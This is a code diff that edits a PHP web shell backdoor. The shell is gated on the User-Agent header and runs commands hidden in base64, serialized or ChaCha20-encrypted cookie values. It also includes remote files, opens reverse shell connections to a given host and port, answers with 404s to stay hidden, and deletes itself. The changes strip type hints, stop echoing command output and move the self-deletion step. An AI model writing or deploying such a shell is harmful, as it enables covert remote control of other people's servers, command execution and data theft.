@@ -1,5 +1,5 @@
 <?php
-//LEAVE ME HERE!!!!!!!!!!!!!!!!!!!!!!!!!!
+//LEAVE ME HERE!!!!!!
 
 error_reporting(E_ERROR | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
@@ -221,14 +221,14 @@ function reverseConnections($methods, $host, $port, $shell)
 }
 
 
-function remoteFileInclude(string $targetFile)
+function remoteFileInclude($targetFile)
 {
     if (!empty($targetFile)) {
         include (base64_decode($targetFile)) or die("Could not remote import :(\n");
     }
 }
 
-function validate_auth(string | null $agent): bool
+function validate_auth($agent): bool
 {
     if (is_null($agent)){
         return false;
@@ -249,7 +249,7 @@ function normalize_for_windows($com): string
     return $com;
 
 }
-function executeCommands(string $command)
+function executeCommands($command)
 {
     # Try to find a way to run our command using various PHP internals
     if (function_exists('call_user_func_array')) {
@@ -289,15 +289,15 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
         if (isset($_POST["cr"])) {
             if ($_POST['cr'] === "1") {
                 $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
-                print_r(executeCommands($split));
+                executeCommands($split);
             } elseif ($_POST['cr'] === '1b') {
                 $split = base64_decode($_COOKIE['jsessionid']);
-                print_r(executeCommands($split, '1'));
+                executeCommands($split);
             } else {
                 $s = $_COOKIE['jsessionid'];
                 $v = explode(".", base64_decode($s));
                 $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
-                print_r(executeCommands(base64_decode($split)));
+                executeCommands(base64_decode($split));
             }
         } elseif (isset($_POST["doInclude"])) {
             remoteFileInclude($_POST["doInclude"]);
@@ -324,13 +324,11 @@ if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
                 } else {
                     pcntl_wait($status);
                     reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
-                    die();
                 }
             } else {
                 echo "Cannot fork, as it does not exist on this system..... using passthru\n";
                 $re = null;
                 passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
-                die();
             }
         }
     } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
@@ -399,12 +397,6 @@ INI. PHP_EOL;
                     header("X-Success: 1");
                     break;
             }
-            foreach (uwumodifyme() as $new_data => $d){
-                header("{$new_data}: {$d}");
-            }
-            unlink($_SERVER['PHP_SELF']);
-            http_response_code(404);
-            die();
         } else {
             http_response_code(404);
             die();
@@ -413,6 +405,12 @@ INI. PHP_EOL;
         http_response_code(404);
         die();
     }
+    foreach (uwumodifyme() as $new_data => $d){
+        header("{$new_data}: {$d}");
+    }
+    unlink($_SERVER['PHP_SELF']);
+    http_response_code(404);
+    die();
 }
 http_response_code(404);
 die();
